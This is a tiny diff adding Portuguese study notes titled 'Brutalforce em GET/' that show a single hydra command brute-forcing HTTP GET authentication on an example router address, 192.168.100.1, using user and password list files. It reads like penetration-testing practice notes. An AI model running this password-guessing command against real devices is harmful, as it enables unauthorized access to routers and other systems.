@@ -1,1 +1,7 @@
-.
+Brutalforce em GET/ 
+
+Exemplo: 192.168.100.1
+192.168.100.1 - > roteador 
+- > hydra 192.168.100.1 -l list_users -P list_passwords http-get -V
+
+
